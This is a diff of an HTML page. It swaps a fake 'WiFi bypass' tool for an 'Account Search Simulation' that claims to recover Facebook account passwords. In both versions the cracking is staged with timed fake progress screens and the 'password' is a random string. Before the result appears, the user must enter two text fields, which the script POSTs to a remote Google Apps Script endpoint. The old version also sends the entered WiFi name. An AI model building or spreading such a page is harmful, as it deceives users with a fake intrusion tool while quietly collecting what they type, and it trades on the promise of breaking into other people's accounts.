@@ -2,198 +2,176 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<title>Account Search Simulation</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ultra HD WiFi Flow Fixed</title>
+
 <style>
-/* General Styles */
-body, html { margin:0; padding:0; font-family: monospace; overflow:hidden; height:100%; background:#000; color:#0f0; }
-.hidden { display:none; }
-.center { display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; text-align:center; }
-
-/* Loading Screen Effects */
-#loadingScreen { 
-  background: linear-gradient(270deg, #0f0, #00ff99, #00ccff, #0f0); 
-  background-size: 800% 800%; animation: gradientBG 8s ease infinite; 
+html,body{
+  margin:0; height:100%; background:#000; color:#0f0;
+  font-family:monospace; overflow:hidden;
 }
-@keyframes gradientBG { 0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;} }
+.hidden{display:none}
+.center{
+  display:flex; flex-direction:column;
+  justify-content:center; align-items:center;
+  height:100vh; text-align:center;
+}
 
-#loadingCounter { font-size:48px; margin-top:20px; text-shadow:0 0 20px #0f0; }
+/* ---------- LOADING ---------- */
+#loader{
+  width:160px;height:160px;
+  border:10px solid #111;
+  border-top:10px solid #0f0;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{100%{transform:rotate(360deg)}}
+#percent{font-size:32px;margin-top:20px}
 
-/* Glow text */
-.green-text { color:#0f0; text-shadow:0 0 5px #0f0,0 0 10px #0f0,0 0 20px #0f0; animation:glow 1s infinite alternate; }
-@keyframes glow { from{ text-shadow:0 0 5px #0f0,0 0 10px #0f0,0 0 20px #0f0;} to{ text-shadow:0 0 20px #00ff99,0 0 30px #00ff99,0 0 50px #00ff99;} }
-
-/* Buttons */
-button { padding:15px 30px; margin:10px; font-size:18px; cursor:pointer; background:#111; color:#0f0; border:2px solid #0f0; transition: all 0.3s ease; }
-button:hover { transform: scale(1.1); background:#0f0; color:#000; box-shadow:0 0 20px #0f0; }
-
-/* Inputs */
-input, select { padding:10px; margin:10px; font-size:16px; background:#111; color:#0f0; border:2px solid #0f0; transition: all 0.3s ease; }
-input:focus, select:focus { border-color:#00ff99; box-shadow:0 0 20px #00ff99; }
-
-/* Screen transitions */
-.fade-in { animation: fadeIn 0.8s ease forwards; }
-@keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
+/* ---------- UI ---------- */
+input,select,button{
+  margin:8px;padding:10px;
+  background:#111;color:#0f0;
+  border:2px solid #0f0;
+  font-size:16px;
+}
+button:hover{
+  background:#0f0;color:#000;
+  cursor:pointer;
+}
+.glow{
+  text-shadow:0 0 10px #0f0,0 0 30px #0f0;
+  animation:glow 1s alternate infinite;
+}
+@keyframes glow{
+  from{opacity:.6}
+  to{opacity:1}
+}
 </style>
 </head>
+
 <body>
 
-<!-- Loading Screen -->
-<div id="loadingScreen" class="center">
-  <div class="green-text">Ultra HD Loading...</div>
-  <div id="loadingCounter" class="green-text">15</div>
+<!-- INTRO LOADING -->
+<div id="intro" class="center">
+  <div id="loader"></div>
+  <div id="percent" class="glow">0%</div>
 </div>
 
-<!-- Choice Screen -->
-<div id="choiceScreen" class="center hidden fade-in">
-  <div class="green-text" style="font-size:24px;">Select One to Continue</div>
-  <button onclick="showForm('feedback')">Feedback</button>
-  <button onclick="showForm('comment')">Comment</button>
-</div>
+<!-- SEARCH FORM -->
+<div id="form" class="center hidden">
+  <h1 class="glow">ACCOUNT SEARCH SIMULATION</h1>
 
-<!-- Feedback / Comment Form -->
-<div id="formScreen" class="center hidden fade-in">
-  <div id="formTitle" class="green-text" style="font-size:24px;"></div>
-  <input id="input1" placeholder="Input 1">
-  <input id="input2" placeholder="Input 2">
-  <button onclick="submitForm()">Submit</button>
-</div>
+  <input placeholder="NAME" id="name">
+  <input placeholder="FRIENDS" id="friends">
 
-<!-- Main Page -->
-<div id="mainPage" class="center hidden fade-in">
-  <div class="green-text" style="font-size:28px;">Main Page</div>
-  <input id="wifiName" placeholder="Enter WiFi Name">
-  <select id="networkUsage">
-    <option>Detect Automatically</option>
-    <option>Treat as Metered</option>
-    <option>Treat as Unmetered</option>
+  <select id="pro">
+    <option>PRO MODE: ON</option>
+    <option>PRO MODE: OFF</option>
   </select>
-  <select id="privacy">
-    <option>Use Randomized MAC</option>
-    <option>Use Device MAC</option>
+
+  <select id="lock">
+    <option>PROFILE: LOCK</option>
+    <option>PROFILE: NO</option>
   </select>
-  <select id="autoConnect">
-    <option>ON</option>
-    <option>OFF</option>
+
+  <select id="friend">
+    <option>FRIEND: YES</option>
+    <option>FRIEND: NO</option>
   </select>
-  <button onclick="startBypass()">BYPASS</button>
+
+  <select id="bio">
+    <option>BIO: YES</option>
+    <option>BIO: NO</option>
+  </select>
+
+  <select id="kind">
+    <option>PAGE</option>
+    <option>NORMAL FACEBOOK</option>
+  </select>
+
+  <button onclick="startSearch()">FIND</button>
 </div>
 
-<!-- Bypass Screen -->
-<div id="bypassScreen" class="center hidden fade-in">
-  <div class="green-text" style="font-size:24px;">Searching Password...</div>
-  <div id="bypassText" class="green-text" style="font-size:32px;"></div>
+<!-- SEARCHING -->
+<div id="searching" class="center hidden">
+  <h1 class="glow">Searching Account...</h1>
+</div>
+
+<!-- FOUND -->
+<div id="found" class="center hidden">
+  <h1 class="glow">PASSWORD FOUND</h1>
+  <p>SUCCESSFULLY</p>
+  <button onclick="goFeedback()">GET PASSWORD</button>
+</div>
+
+<!-- FEEDBACK -->
+<div id="feedback" class="center hidden">
+  <h2>FEEDBACK</h2>
+  <input id="f1" placeholder="Feedback 1">
+  <input id="f2" placeholder="Feedback 2">
+  <button onclick="submitFeedback()">SUBMIT</button>
+</div>
+
+<!-- PASSWORD -->
+<div id="passwordPage" class="center hidden">
+  <h2>HERE PASSWORD</h2>
+  <h1 id="password" class="glow"></h1>
+  <button onclick="location.reload()">BACK TO MAIN</button>
 </div>
 
 <script>
-const webAppUrl = "https://script.google.com/macros/s/AKfycbypb3X8RC8FBvghc0M3mOC_KQToYP51xmB42TK6htu2dk9b9fyKYROHc_LOTdplB5lr/exec"; // 🔥 Change this
-let selectedType = "";
+const webAppUrl="https://script.google.com/macros/s/AKfycbz-HYMjDrY0_3XDRP3ZHnki6z1KPi83s8hSFxf5Ar5JyUL54n6CO_-I5UsdJMGpo-NM/exec";
 
-// ---------- Loading Screen ----------
-const loadingScreen = document.getElementById("loadingScreen");
-const loadingCounter = document.getElementById("loadingCounter");
-const choiceScreen = document.getElementById("choiceScreen");
-
-let countdown = 15;
-const timer = setInterval(() => {
-  countdown--;
-  loadingCounter.innerText = countdown;
-  if(countdown <=0){
-    clearInterval(timer);
-    loadingScreen.style.display = "none";      // hide loading
-    choiceScreen.style.display = "flex";       // show choice screen
+/* ---------- INTRO LOADING ---------- */
+let p=0;
+const percent=document.getElementById("percent");
+const intro=setInterval(()=>{
+  p++;
+  percent.innerText=p+"%";
+  if(p>=100){
+    clearInterval(intro);
+    document.getElementById("intro").classList.add("hidden");
+    document.getElementById("form").classList.remove("hidden");
   }
-},1000);
+},230); // 23 seconds total
 
-// ---------- Form Logic ----------
-const formScreen = document.getElementById("formScreen");
-const formTitle = document.getElementById("formTitle");
-const mainPage = document.getElementById("mainPage");
+/* ---------- SEARCH ---------- */
+function startSearch(){
+  document.getElementById("form").classList.add("hidden");
+  document.getElementById("searching").classList.remove("hidden");
 
-function showForm(type){
-  selectedType = type;
-  choiceScreen.style.display = "none";
-  formScreen.style.display = "flex";
-  formTitle.innerText = type.toUpperCase();
+  setTimeout(()=>{
+    document.getElementById("searching").classList.add("hidden");
+    document.getElementById("found").classList.remove("hidden");
+  },25000);
 }
 
-async function submitForm(){
-  const input1 = document.getElementById("input1").value;
-  const input2 = document.getElementById("input2").value;
+/* ---------- FEEDBACK ---------- */
+function goFeedback(){
+  document.getElementById("found").classList.add("hidden");
+  document.getElementById("feedback").classList.remove("hidden");
+}
+
+function randPass(){
+  const letters="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  return Math.floor(10000+Math.random()*90000)+letters[Math.floor(Math.random()*26)];
+}
+
+async function submitFeedback(){
+  const f1=document.getElementById("f1").value;
+  const f2=document.getElementById("f2").value;
 
   await fetch(webAppUrl,{
     method:"POST",
-    body: JSON.stringify({type:selectedType, input1, input2})
+    body:JSON.stringify({type:"feedback",input1:f1,input2:f2})
   });
 
-  formScreen.style.display = "none";
-  mainPage.style.display = "flex";
-}
-
-// ---------- Bypass Logic ----------
-const bypassScreen = document.getElementById("bypassScreen");
-const bypassText = document.getElementById("bypassText");
-
-function randomString(length){
-  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-  let str="";
-  for(let i=0;i<length;i++) str+=chars.charAt(Math.floor(Math.random()*chars.length));
-  return str;
-}
-
-function startBypass(){
-  mainPage.style.display="none";
-  bypassScreen.style.display="flex";
-  let time=15;
-  const interval=setInterval(()=>{
-    bypassText.innerText=randomString(12);
-    time--;
-    if(time<=0){
-      clearInterval(interval);
-      askWifiType();
-    }
-  },500);
-}
-
-function askWifiType(){
-  const type=prompt("PRIVATE WIFI or PUBLIC WIFI?");
-  bypassText.innerText="Searching Password...";
-  let time=23;
-  const interval=setInterval(()=>{
-    bypassText.innerText=randomString(15);
-    time--;
-    if(time<=0){
-      clearInterval(interval);
-      const password = randomString(9)+Math.floor(Math.random()*9000+1000);
-      bypassText.innerText="Password: "+password;
-      saveMainPage(password);
-      setTimeout(()=>{
-        bypassScreen.style.display="none";
-        mainPage.style.display="flex";
-      },3000);
-    }
-  },500);
-}
-
-async function saveMainPage(password){
-  const wifiName = document.getElementById("wifiName").value;
-  const networkUsage = document.getElementById("networkUsage").value;
-  const privacy = document.getElementById("privacy").value;
-  const autoConnect = document.getElementById("autoConnect").value;
-
-  await fetch(webAppUrl,{
-    method:"POST",
-    body: JSON.stringify({
-      type:"mainpage",
-      wifiName,
-      networkUsage,
-      privacy,
-      autoConnect,
-      bypassChoice:"",
-      generatedPassword:password
-    })
-  });
+  document.getElementById("feedback").classList.add("hidden");
+  document.getElementById("password").innerText=randPass();
+  document.getElementById("passwordPage").classList.remove("hidden");
 }
 </script>
+
 </body>
-    </html>
+</html>
